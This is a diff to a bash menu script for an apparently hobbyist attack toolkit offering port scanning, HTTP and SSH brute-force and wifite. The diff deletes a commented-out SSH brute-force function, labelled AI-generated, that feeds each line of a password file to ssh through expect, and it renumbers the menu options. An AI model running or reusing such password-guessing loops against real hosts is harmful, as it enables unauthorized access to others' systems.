@@ -38,10 +38,9 @@ function main(){
     echo -e "${WB}[1] Port scan"
     echo -e "[2] HTTP Brute-force attack"
     echo -e "[3] SSH Brute-force attack"
-    echo -e "[4] SSH Brute-force attack v2"
-    echo -e "[5] wifite"
-    echo -e "[6] Check ping"
-    echo -e "[7] Exit"
+    echo -e "[4] wifite"
+    echo -e "[5] Check ping"
+    echo -e "[6] Exit"
     echo ""
     echo -ne "Choose an option (1|2|3|4|5|6|7): "
     read option 
@@ -109,46 +108,8 @@ function opt3() {
     exit 1
 }
 
-# ANOTHER BRUTE-FORCE ATTACK BUT FOR SSH USING OPENSSH (AI Generated)
-#function opt4() {
-#    clear
-#    userinterface
-#    echo ""
-#    echo -e "${WB}SSH BRUTE-FORCE ATTACK v2\n"
-#    echo -ne "[*] Enter username: "
-#    read username
-#    echo -ne "[*] Enter IP (host): "
-#    read ip
-#    echo -e "\nBRUTE-FORCING...\n${RED}"
-#
-#    passwords="/home/fr0g/pass.txt"
-#
-#    for password in $(cat $passwords); 
-#        do
-#            expect -c "
-#                spawn sudo ssh $username@$ip
-#                expect {
-#                    \"*assword:\" {
-#                        send \"$password\n\"
-#                        interact
-#                    }
-#                    \"yes/no\" {
-#                        send \"yes\n\"
-#                        exp_continue
-#                    }
-#                }
-#            "
-#            if [[ $? -eq 0 ]]; then
-#                echo "Attacked successfully"
-#                break
-#            else
-#                echo "Attack failed: $password"
-#            fi
-#        done
-#}
-
 # WIFITE FOR VARIOUS TYPES OF WIRELESS ATTACKS
-function opt5() {
+function opt4() {
     clear
     userinterface
     echo ""
@@ -159,7 +120,7 @@ function opt5() {
 }
 
 # CHECK IF HOST IS UP OR DOWN USING PING
-function opt6() {
+function opt5() {
     clear
     userinterface
     echo ""
@@ -181,7 +142,7 @@ function opt6() {
 }
 
 # EXIT OUT OF THE SCRIPT
-function opt7() {
+function opt6() {
     exit 1
 }
 
